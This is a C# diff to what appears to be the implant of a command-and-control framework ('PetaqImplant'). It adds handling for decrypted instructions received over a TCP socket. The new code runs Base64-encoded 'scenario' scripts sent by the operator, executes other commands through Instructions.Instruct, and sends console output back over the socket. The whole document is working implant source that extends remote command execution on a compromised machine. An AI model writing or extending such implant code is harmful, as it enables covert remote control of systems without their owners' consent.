@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Net;
 using System.Net.Sockets;
+using System.Text.RegularExpressions;
 
 using System.Net.WebSockets;
 using System.Text;
@@ -68,8 +69,32 @@ namespace PetaqImplant
                         string instruction = TCPClientStream.ReadString();
                         instruction = Common.Decrypt(instruction);
 
-                        //Instruction is processing...
-                        Instructions.Instruct(instruction);
+                        // If scenario is requested call scenario, otherwise run instructions
+                        if (instruction.StartsWith("scenario"))
+                        {
+                            if (Regex.Split(instruction," ").Length < 3)
+                            {
+                                // Set the socket as the Console output
+                                Program.consoleIO = Console.Out;
+                                Console.SetOut(new SocketWriter());
+                                // Raise the error
+                                Console.WriteLine("Usage: scenario file filepath");
+                            }
+                            else
+                            {
+                                // scenario instruction format:
+                                // scenario file BASE64STRING
+                                string scenario_b64 = Regex.Split(instruction," ")[2];
+                                // send the Base64 encoded scenario to run
+                                PetaqImplant.Scenario.Run(scenario_b64);
+                            }
+
+                        }
+                        else
+                        {
+                            // run the instruction received
+                            PetaqImplant.Instructions.Instruct(instruction, new SocketWriter());
+                        }
                     }
 
                 }
